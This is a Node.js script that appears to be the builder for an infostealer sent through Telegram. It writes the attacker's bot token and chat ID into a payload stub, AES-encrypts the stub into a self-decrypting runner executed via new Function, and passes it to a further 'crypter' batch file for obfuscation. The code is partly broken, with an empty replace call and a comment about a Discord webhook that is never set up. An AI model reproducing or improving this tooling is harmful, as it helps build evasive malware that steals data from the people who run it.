const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const readline = require('readline');
const { execSync } = require('child_process');
const colors = require('colors');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const user = {
  hostname: os.hostname(),
};

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

async function sendTestMessage(botToken, chatId) {
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const testMessage = {
    chat_id: chatId,
    text: '**Build Start, be patient for 1-2min ✅**',
    parse_mode: 'Markdown',
  };

  try {
    await axios.post(apiUrl, testMessage);
    console.log('');
    console.log('  '.white + '['.white + '+'.green + ']'.white + ' Your Telegram Bot Works Perfectly ! '.white);
  } catch (error) {
    console.error('  '.white + '['.white + '!'.red + ']'.white + ' Your Telegram Bot Does Not Work ! '.white);
  }
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function promptForTelegramCredentials() {
  return new Promise((resolve) => {
    rl.question(
      '  '.white + '['.white + '?'.blue + ']'.white + ' Enter your Telegram Bot Token: (right click to paste)>>> ',
      (botToken) => {
        rl.question('  '.white + '['.white + '?'.blue + ']'.white + ' Enter your Telegram Chat ID: (https://t.me/chatIDrobot)>>> ', (chatId) => {
          rl.close();
          resolve({ botToken, chatId });
        });
      }
    );
  });
}

function executeSecondCrypterScript() {
  const crypterDirectory = path.join(__dirname, '..', 'obf');
  const secondCrypterScript = 'call obf.bat';

  try {
    const output = execSync(secondCrypterScript, { cwd: crypterDirectory, stdio: 'inherit' });
    console.log(`Second crypter script output: ${output}`);
  } catch (error) {
    console.error(`Error executing the second crypter script: ${error.message}`);
  }
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('Success reset.');
}

async function main() {
  let originalStubCode; // Variable to store the original stub code

  try {
    const { botToken, chatId } = await promptForTelegramCredentials();

    // Update the values in stub.js for Telegram
    const stubPath = path.resolve(__dirname, 'stub.js');
    originalStubCode = fs.readFileSync(stubPath, 'utf8'); 
    const updatedStubCode = originalStubCode 
    .replace(/const telegramBotToken = 'REPLACE_ME';/, `const telegramBotToken = '${botToken}';`)
    .replace(/const telegramChatId = 'REPLACE_ME';/, `const telegramChatId = '${chatId}';`);

    if (originalStubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    // Write the updated stub code back to the file
    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Send a test message to the provided Telegram Bot
    await sendTestMessage(botToken, chatId);

    const updatedStubCodeWithWebhook = updatedStubCode.replace(
      
    );

    // Write the updated stub code with Discord webhook back to the file
    fs.writeFileSync(stubPath, updatedStubCodeWithWebhook, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCodeWithWebhook, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = '../obf'; // Target folder name
    const fileName = 'input.js'; // Target file name
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);

    setTimeout(() => {
      resetPlaceholder(stubPath, originalStubCode);
      executeSecondCrypterScript();
    }, 3000);

  } catch (error) {
    console.error(`Error: ${error.message}`);

    // If an error occurs, ensure to reset the modified elements
    if (originalStubCode) {
      const updatedStubPath = path.resolve(__dirname, 'stub.js');
      resetPlaceholder(updatedStubPath, originalStubCode);
    }
  } finally {
    // Close the readline interface to avoid resource leaks
    rl.close();
  }
}

main();
